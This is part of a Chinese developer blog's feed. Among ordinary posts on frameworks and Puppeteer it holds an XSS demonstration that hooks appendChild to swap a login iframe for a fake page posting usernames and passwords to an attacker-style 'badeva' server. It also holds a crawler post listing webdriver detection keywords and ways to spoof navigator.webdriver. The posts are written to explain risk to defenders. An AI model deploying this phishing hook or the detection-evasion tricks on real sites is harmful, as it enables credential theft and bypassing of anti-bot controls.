title="期望"></a>期望</h4><p>我的第一份工作虽然不是什么大厂，但是很庆幸一开始就遇到拎得清的老大，实名感谢。他虽然是个后端架构师，但是一开始就主张不要使用内部框架而是领先使用Angular，有什么坑他来扛。</p><p>虽然他也跟我说这有点面向简历编程，但是这对你们来说是好事，虽然大部分人的工作其实都是搬砖，内部框架你玩得再6，一换工作，你所有的积累都化为0，如果一直使用的是有影响力的开源框架，至少下一份工作你能说你最起码用过某个主流框架。</p><p>最开始就听leader说赶进度三个人一天写了三百个页面还觉得很震惊。其实即使不使用任何框架，大牛们写好基础组件，搭积木一样，天天ctrl +C+V，完全是正常的。</p><p>超哥也跟我说，一般人工作到一定的阶段都会感觉到没开始那么难，因为你对代码越来越熟悉，你知道哪里有坑，不可能一直都是搬砖状态。想想也是，上文中如果直接使用antd，只不过需要写些扩展组件，小弟们后来也一样能六周变一周，有时间读源码，再安排些真正的技术分享，简直是一个应届生最大的幸运。</p><p>小伙伴吐槽来了个领导是阿里的，之前用weex，所以现在他们也开始招weex开发，好歹weex也是开源的，（他说其实阿里自己都快不用weex了？不了解，待考）。技术选型用啥其实我们作为小白的时候也做不了主，但是可以用来做找工作的重要考核，而且希望看到这篇文章的你们以后当了leader之后在技术选型上也能慎重。</p><p>再就是我虽然建议选主流框架，但并不是说原生js的实践能力不重要，作为一个前端，<strong>这是最最重要的基本功。</strong></p><p>只是有的时候你会发现自己写的框架自己看了都恶心，最重要的是还特别大，实际上你清醒一点，vue只有39kb，jquery只有36kb，比你自己写的东一榔头西一锤子要好。当然啦，你可以写着玩儿，但是公司雇你来不是让你玩儿的哈哈哈。为了提高技术我们真的应该自己研究下框架是咋实现的，但是要对自己的实现负责，不要强迫别人来研究你写的框架，使用了框架自己整理util，mixin还是必不可少的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有人说，你们前端的kpi就是隔几年就换个框架全部重构一遍来完成的，哟呵，这都被你发现了。</p><p>其实也不是我们的问题，只是JS不像其他语言那样有自己的核心库，需要依赖一些外部框架，二是前端发展确实太快了，总有新框架新方案解决新问题，但是每年重构换框架，哪有那么容易。</p><p>为了不被别人鄙视，真的应该好好读读源码。</p><p>今天吐槽先到这里吧，最后的结论是啥呢。</p><p>老是有小伙伴说没有机会去实践主流框架，内部管理系统是干啥的？</p><p>总之记住一条原则：<strong>不要拿外部有影响力的项目来练手，在内部系统中使用新技术做一些有趣的尝试，积累经验踩过坑之后再用在外部系统中。</strong></p><p>每日写文吐槽：</p><p>吐槽文写的就是畅快，很easy就写完了。其实很喜欢现在的工作状态，有时间全面了解知识并实践，和刚开始写不出来文章相比，已经积累了很多选题，就是需要时间完善整理。</p><p>我知道我的排版丑，如果有思维导图就更好，也知道哪里去找好看不侵权的图，用什么工具来画图，作为一个前端还想做自己的主题（答应超哥2年了也没写），还准备要咨询专业写公众号的毛毛来学习排版。</p><p>先弱弱地找个借口，现在还没走上正轨，但我一向是一个守诺的人，周末了，能有个时间来缓冲，希望大家监督</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章是个吐槽文，小伙伴们看着玩儿吧，更希望你们能跟我分享你的观点。&lt;/p&gt;
&lt;h4 id=&quot;引子&quot;&gt;&lt;a href=&quot;#引子&quot; class=&quot;headerlink&quot; title=&quot;引子&quot;&gt;&lt;/a&gt;引子&lt;/h4&gt;&lt;p&gt;之前有个四年换了五份工作的技术leader，过来给我们技术分享，实际也没讲什么技术，因为主要是内部后台管理系统，主要分享了下团队管理。&lt;/p&gt;
&lt;p&gt;他说我的团队成员很幸福，我们不用antd，不好用，我自研了ui框架，小弟们只需要搭积木一样搭起来就可以了。我招的人都学会了这个框架，每次我换工作都带着他们一起换。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Team" scheme="https://evacoder.com/tags/Team/"/>
    
  </entry>
  
  <entry>
    <title>「 安全 」从iframe说到万物皆可hook</title>
    <link href="https://evacoder.com/2019/02/15/iframe_security/"/>
    <id>https://evacoder.com/2019/02/15/iframe_security/</id>
    <published>2019-02-15T09:06:31.000Z</published>
    <updated>2019-05-13T06:07:01.393Z</updated>
    
    <content type="html"><![CDATA[<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：</p><blockquote><p>如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。</p></blockquote><p>what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！</p><p>作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>但是作为一个与用户交互最紧密的前端，登录页总是302跳转到新的页面对于用户来说其实是非常不友好的，打断了用户操作，跳过去跳过来的都晕了，如果能够弹窗登录，那抢手机的路上将一气呵成，非常愉快呀！<br>弹窗登录一般都是 iframe 实现的，因为大家一般都是 sso 登录，也就是说要做出一个通用的框架，所以一般使用 iframe。</p><p>我弱弱的说了句，嗯，百度好像也是 iframe 呀，其他也有很多厂商是 iframe 的，这样的问题并不是很严重吧。<br>没想到大佬们立刻就开始研究百度的弹窗。结论是：<br>做的很巧妙啊！点击之后才出弹窗，xss 一般都是一开始就进行篡改，但是这种方式的话，坏人没办法获取用户点击【登录】的时机，这样应该没那么容易篡改。</p><h4 id="万物皆可hook"><a href="#万物皆可hook" class="headerlink" title="万物皆可hook"></a>万物皆可hook</h4><p>听得有点懵，后来才明白，他们就是想hook用户点击登录的click事件。</p><p>哈哈，术业有专攻。终于轮到我们前端大展身手的时候了，他们是不知道我们的【万物皆可hook】定理。</p><p>千千音乐盒为例：<br><img src="/images/qian1.png" alt=""></p><p>点击登录之后，弹出了iframe，这时候一般都会有服务器交互，我们先看看chrome devtool的network，但是出现了好多条请求。这时候我们右键单击审查元素，看看iframe的src，其实凭经验来说，这种弹窗一般都是调用document.body.appendChild来添加在页面中，但是有更好的方法来佐证。</p><p><img src="/images/qian3.png" alt=""><br>重要小tips：network中的Initiator会展示出发出请求的具体代码行数，点击一下就可以定位到具体是哪一行发出了这个请求。代码一般都压缩了的，点击下面的{}就可以格式化代码。果不其然，就是调用了appendChild，再看下html结构，显然是在append在body中的。</p><p>感兴趣的可以查看chrome devTool的使用（TODO）。</p><p>既然锁定了调用的是document.body.appendChild，那我们就可以放心的hook啦！<br>核心代码很简单，就是使用了js的call方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'hook success'</span>);</span><br><span class="line">  append.call(<span class="built_in">document</span>.body, el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们成功的hook了document.body.appendChild方法，在执行原来操作方式之前执行了我们的alert。</p><p>大佬要求我完整的实现隐藏原来的弹窗，弹出自己实现的弹窗。</p><p>那代码量应该不少吧。我们xss只能插入js，插入不了css，即使实现了也应该很丑吧。</p><p>no，no，no。</p><p>js啥都能插入!</p><p>html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const fakeIframe = document.createElement(&apos;div&apos;);</span><br></pre></td></tr></table></figure><p>css</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.style= &apos;border:1px solid #f8f8f8&apos;;</span><br></pre></td></tr></table></figure><p>就是需要写好多dom操作的代码。</p><p>or 直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.innerHTML=&apos;&lt;iframe allowtransparency=&quot;true&quot; style=&quot;border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;&quot;</span><br><span class="line">src=&quot;//passport.taihe.com/v2/web/popLogin.html?target=pop&amp;amp;u=https%3A%2F%2Fplay.taihe.com&amp;amp;staticPage=https%3A%2F%2Fplay.taihe.com%2Fplayer%2Ftpassjump.html&amp;amp;callback=tpass15504710495271&amp;amp;tpl=baidu_music&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>本来打算自己写个iframe 登录页，转念一想，直接把他的页面copy出来算了，美观靠谱又省事儿。<br>打开//passport.taihe.com/v2/web/popLogin.html，chrome dev tool network，copy出popLogin.html的代码。<br>加上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.tpass-button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/badEva/collect'</span>,</span><br><span class="line">    type: <span class="string">'POST'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      username: $(<span class="string">'.tpass-text-input-userName'</span>).val(),</span><br><span class="line">      pwd: $(<span class="string">'.tpass-text-input-password'</span>).val(),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>部署在自己的server上，得到url如//passport.badeva.com/fakeLogin.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fakeIframe = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  fakeIframe.innerHTML = <span class="string">'&lt;iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;" src="//passport.badeva.com/fakeLogin.html" &gt;&lt;/iframe&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上四行代码就可以搞定了。</p><p>其实还有很多技术点可以细挖，先不展开说了。</p><h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>回想起来，这些思路还是来自于hook极验验证结果时得出来的。</p><p>引入了极验的sdk，但是用户每次滑动点选的结果对接入方来说是透明的，但是我们需要这些数据来进行分析，怎么才能得到用户每次验证的结果呢？</p><p>大家都说，页面都是你的页面，连个结果都获取不到？？？</p><p>计算每次的轨迹？</p><p>思考良久，脑子里突然闪过iOS里的method swizzling，具体是干啥的也不记得了，只记得method swizzling 黑魔法。</p><p>我的地盘我做主，怎么可能获取不到呢？</p><p>脑子里又闪过hook这个词。</p><p>对了，他们总是要给服务端结果的啊！hook他们的请求！</p><p>跨域只能jsonp，jsonp一般都是document.header.appendChild，轻轻松松得到结果，具体代码你可以自己试着写写。</p><p>但是随着时代的进步，极验也换用了CORS来进行跨域，hook Ajax就没有那么容易了。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>大佬们很震惊，难道没有别的办法可以防止被hook吗？其实我们还是希望可以使用iframe来提升用户体验的。</p><p>但事实上js注入之后，可以做的事儿太多了。弹出iframe绕不过appendChild那些基础API，有xss漏洞就相当于敞开大门让坏人进来。</p><p>几乎是防不胜防。</p><p>所以更是提醒我们为了安全：</p><p>1.要尽量避免xss漏洞，请看这篇（TODO）</p><p>2.引入第三方js，一定要注意查看下network中是否有什么不清不楚的接口，偷偷的搜集了某些信息上送给别的服务端。</p><p>从这篇文章获取到的，你可以自己总结下。<br>顺便思考下hook Ajax的方法。</p><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>虽然很绝望，但是首先，你需要一个xss漏洞。</p><p>大佬们微微一笑，xss漏洞远比你想象的多得多，即使简单的一个登录页就这段时间都检测出来了好多xss漏洞。</p><p>iframe白名单这个口子真的不能那么容易就打开呀，公司其实有很多赶工期的项目，开发周期短，代码写成啥样大家都懂，其实很容易出现xss漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h4&gt;&lt;p&gt;今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！&lt;/p&gt;
&lt;p&gt;作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。&lt;br&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://evacoder.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>「 puppeteer 」从puppeteer谈前端爬虫检测和绕过</title>
    <link href="https://evacoder.com/2019/02/14/js_check_spider/"/>
    <id>https://evacoder.com/2019/02/14/js_check_spider/</id>
    <published>2019-02-14T10:20:35.000Z</published>
    <updated>2019-03-13T10:46:40.577Z</updated>
    
    <content type="html"><![CDATA[<p>检测Headless Chrome/ webdriver/ selenium/ puppeteer</p><p>爬虫检测是一个攻防的过程，js是裸露在外的，在坏人手里的，我们只能想办法提高作恶的成本。</p><p>各处搜集整理信息了很久，后来发现 <a href="https://intoli.com/blog/not-possible-to-block-chrome-headless/" target="_blank" rel="noopener">这篇文章</a> 讲的非常清楚，本地化一下，加上一些自己的理解。</p><p>phantom，webdriver，puppeteer等爬虫都有设置的方法，本文主要从puppeteer来分析。</p><a id="more"></a><h4 id="1-navigator-userAgent"><a href="#1-navigator-userAgent" class="headerlink" title="1.navigator.userAgent"></a>1.navigator.userAgent</h4><p>防：<code>/HeadlessChrome/.test(window.navigator.userAgent)</code>一般判断ua中有headless字样都没跑了，肯定是爬虫。<br>攻：puppeteer可以设置ua，甚至直接设置device。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.setViewport(conf.viewport);</span><br><span class="line"><span class="keyword">await</span> page.setUserAgent(conf.ua);</span><br><span class="line"><span class="keyword">await</span> page.emulate(conf.device);</span><br></pre></td></tr></table></figure><h4 id="2-检测webdriver标志字段"><a href="#2-检测webdriver标志字段" class="headerlink" title="2.检测webdriver标志字段"></a>2.检测webdriver标志字段</h4><p>防：检测window object中是否有任何<code>selenium/webdriver/$cdc_/$wdc_</code>等字样。</p><p>以下是搜索到的字段标志，只测试了在正常访问状态下并没有这些字段。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webdriver keywords</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectWebDriver</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> r = [];</span><br><span class="line"><span class="keyword">const</span> w = [<span class="string">'webdriver'</span>, <span class="string">'__driver_evaluate'</span>, <span class="string">'__webdriver_evaluate'</span>,</span><br><span class="line"><span class="string">' __selenium_evaluate'</span>, <span class="string">'__fxdriver_evaluate'</span>, <span class="string">'__driver_unwrapped'</span>,</span><br><span class="line"><span class="string">'__webdriver_unwrapped'</span>, <span class="string">'__selenium_unwrapped'</span>, <span class="string">'__fxdriver_unwrapped'</span>,</span><br><span class="line"><span class="string">'_Selenium_IDE_Recorder'</span>, <span class="string">'_selenium'</span>, <span class="string">'calledSelenium'</span>,</span><br><span class="line"><span class="string">'_WEBDRIVER_ELEM_CACHE'</span>, <span class="string">'ChromeDriverw'</span>, <span class="string">'driver-evaluate'</span>,</span><br><span class="line"><span class="string">'webdriver-evaluate'</span>, <span class="string">'selenium-evaluate'</span>, <span class="string">'webdriverCommand'</span>,</span><br><span class="line">  <span class="string">'webdriver-evaluate-response'</span>,<span class="string">'__webdriverFunc'</span>, <span class="string">'__webdriver_script_fn'</span>,</span><br><span class="line">  <span class="string">'__$webdriverAsyncExecutor'</span>, <span class="string">'__lastWatirAlert'</span>,</span><br><span class="line"><span class="string">'__lastWatirConfirm'</span>, <span class="string">'__lastWatirPrompt'</span>, <span class="string">'$chrome_asyncScriptInfo'</span>,</span><br><span class="line">  <span class="string">'$cdc_asdjflasutopfhvcZLmcfl_'</span>, <span class="string">'_phantom'</span>, <span class="string">'_phantomas'</span>];</span><br><span class="line">w.forEach(<span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!!<span class="built_in">window</span>[t] || !!<span class="built_in">window</span>.document.documentElement.getAttribute(t) || !!navigator[t]) &#123;</span><br><span class="line">r.push(t);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>人力限制不一个个测试了，不放心的话前期先记录下命中词，之后可以只要遇到命中词就拉黑拒绝提供服务。</p><p>攻：使用puppeteer会检测到webdriver，navigator.webdriver为true。</p><p>试着加上了<code>navigator.webdriver=false</code>实际上并不会生效，console出来依然是false。</p><p><code>const isAutomated = navigator.webdriver</code></p><p>这个字段就是标志了一切自动化。</p><p><code>navigator.userAgent=&#39;test&#39;</code>设置了再console也是无效的。</p><p>实际上可以使用Object.defineProperty来修改原生对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluate(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(navigator, <span class="string">'webdriver'</span>, &#123; <span class="attr">get</span>: <span class="function"><span class="params">()</span>=&gt;</span> <span class="literal">false</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是对于反爬方来说，一般在你进入页面的时候就已经开始检测是否是爬虫，立即停止服务了，在puppeteer中篡改已经晚了。</p><p>这种时候可以通过<strong>代理工具</strong>，fiddler，charles都可以完成js的注入。</p><ul><li>在检测爬虫的js前加上以上的篡改js。</li><li>或者先在正常状态下分析下源码具体检测爬虫的代码，使用代理工具，去掉识别webdriver的js（或者直接返回不是爬虫）之后再继续爬，当然这很难。</li></ul><p>前面说了js是裸奔的，顶多代码混淆下，但是也是在坏人手里的，想怎么改怎么改，只能说提高坏人作恶的成本。</p><p>防御方只能进行更大强度的代码混淆（其实也没啥用）。</p><h4 id="3-window-chrome"><a href="#3-window-chrome" class="headerlink" title="3.window.chrome"></a>3.window.chrome</h4><p>防：<code>!window.chrome||!window.chrome.runtime</code>如果是自动化的话，window.chrome会是undefined</p><p>攻：经测试puppeteer设置headless:true时，window.chrome是有值的，虽然会慢一点。或者反正也能篡改js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.navigator.chrome = &#123;</span><br><span class="line">runtime: &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有其他的检测plugins，language以及permissions，实际都可以被篡改。</p><p>看完是不是觉得非常悲观，怎么也拦不住！</p><p>还是那句话，能拦多少拦多少呗！</p><p>搞一些骚气一点的走位，其实你也发现不了我在哪里检测了</p><p>基本检测方式如下，当然还有很多别的指标来判断，我才不会告诉你。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectAuto</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/HeadlessChrome/</span>.test(navigator.userAgent) || <span class="comment">// ua test</span></span><br><span class="line">    !<span class="built_in">window</span>.chrome || <span class="comment">// headless test</span></span><br><span class="line">    navigator.plugins.length === <span class="number">0</span> || <span class="comment">//plugins test</span></span><br><span class="line">    <span class="comment">// languages test</span></span><br><span class="line">    !navigator.languages || navigator.languages.length === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> permissionStatus = <span class="keyword">await</span> navigator.permissions.query(&#123; <span class="attr">name</span>: <span class="string">'notifications'</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (Notification.permission === <span class="string">'denied'</span> &amp;&amp; permissionStatus.state === <span class="string">'prompt'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> r = [];</span><br><span class="line">  <span class="keyword">const</span> w = [<span class="string">'webdriver'</span>, <span class="string">'__driver_evaluate'</span>, <span class="string">'__webdriver_evaluate'</span>,</span><br><span class="line">    <span class="string">' __selenium_evaluate'</span>, <span class="string">'__fxdriver_evaluate'</span>, <span class="string">'__driver_unwrapped'</span>,</span><br><span class="line">    <span class="string">'__webdriver_unwrapped'</span>, <span class="string">'__selenium_unwrapped'</span>, <span class="string">'__fxdriver_unwrapped'</span>,</span><br><span class="line">    <span class="string">'_Selenium_IDE_Recorder'</span>, <span class="string">'_selenium'</span>, <span class="string">'calledSelenium'</span>,</span><br><span class="line">    <span class="string">'_WEBDRIVER_ELEM_CACHE'</span>, <span class="string">'ChromeDriverw'</span>, <span class="string">'driver-evaluate'</span>,</span><br><span class="line">    <span class="string">'webdriver-evaluate'</span>, <span class="string">'selenium-evaluate'</span>, <span class="string">'webdriverCommand'</span>, <span class="string">'webdriver-evaluate-response'</span>,</span><br><span class="line">    <span class="string">'__webdriverFunc'</span>, <span class="string">'__webdriver_script_fn'</span>, <span class="string">'__$webdriverAsyncExecutor'</span>, <span class="string">'__lastWatirAlert'</span>,</span><br><span class="line">    <span class="string">'__lastWatirConfirm'</span>, <span class="string">'__lastWatirPrompt'</span>, <span class="string">'$chrome_asyncScriptInfo'</span>, <span class="string">'$cdc_asdjflasutopfhvcZLmcfl_'</span>,</span><br><span class="line">    <span class="string">'_phantom'</span>, <span class="string">'_phantomas'</span>,</span><br><span class="line">  ];</span><br><span class="line">  w.forEach(<span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!!<span class="built_in">window</span>[t] || !!<span class="built_in">window</span>.document.documentElement.getAttribute(t) || !!navigator[t]) &#123;</span><br><span class="line">      r.push(t);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> r.length &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过js已整理好，但是还是不分享给你们这群坏人了。</p><p>参考：</p><p><a href="https://intoli.com/blog/not-possible-to-block-chrome-headless/" target="_blank" rel="noopener">https://intoli.com/blog/not-possible-to-block-chrome-headless/</a></p><p><a href="https://intoli.com/blog/making-chrome-headless-undetectable/" target="_blank" rel="noopener">https://intoli.com/blog/making-chrome-headless-undetectable/</a></p><p><a href="https://www.zhihu.com/question/50738719" target="_blank" rel="noopener">https://www.zhihu.com/question/50738719</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;检测Headless Chrome/ webdriver/ selenium/ puppeteer&lt;/p&gt;
&lt;p&gt;爬虫检测是一个攻防的过程，js是裸露在外的，在坏人手里的，我们只能想办法提高作恶的成本。&lt;/p&gt;
&lt;p&gt;各处搜集整理信息了很久，后来发现 &lt;a href=&quot;https://intoli.com/blog/not-possible-to-block-chrome-headless/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这篇文章&lt;/a&gt; 讲的非常清楚，本地化一下，加上一些自己的理解。&lt;/p&gt;
&lt;p&gt;phantom，webdriver，puppeteer等爬虫都有设置的方法，本文主要从puppeteer来分析。&lt;/p&gt;
    
    </summary>
    
    
      <category term="puppeteer" scheme="https://evacoder.com/tags/puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>「 puppeteer 」puppeteer初尝试</title>
    <link href="https://evacoder.com/2019/02/13/puppeteer_try/"/>
    <id>https://evacoder.com/2019/02/13/puppeteer_try/</id>
    <published>2019-02-13T10:20:35.000Z</published>
    <updated>2019-03-13T10:56:06.549Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇中我们通过自己手写代码完成了抓取list页中的基本数据，可是沙沙又提出了新的需求，如何抓取到每个酒店的装修时间和客房数量呢？我让她自己去研究八爪鱼去了，但是如果是真的撩妹，这可不就前功尽弃了。</p><p>正好最近在研究反作弊中判断是否是webdriver，headless chrome，发现一个神器puppeteer，不需要学习python，用nodeJS就可以搞定，我的键盘已经等不及了，用了一天时间研究，分享给大家。</p><p>其实主要是async和await的理解不够深刻，多花费了时间，实际上聪明如你半个小时应该就可以学会。</p><a id="more"></a><h4 id="puppeteer"><a href="#puppeteer" class="headerlink" title="puppeteer"></a>puppeteer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建个项目安装puppeteer</span></span><br><span class="line">npm i puppeteer -S</span><br></pre></td></tr></table></figure><p>官方demo就很容易上手，再加上awesome-puppeteer中的<a href="https://medium.com/@e_mad_ehsan/getting-started-with-puppeteer-and-chrome-headless-for-web-scrapping-6bf5979dee3e" target="_blank" rel="noopener">例子</a>，很容易就可以实现自己的目标。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> conf = &#123;</span><br><span class="line">    <span class="comment">// 还是携程上海五角场江湾地区的url</span></span><br><span class="line">    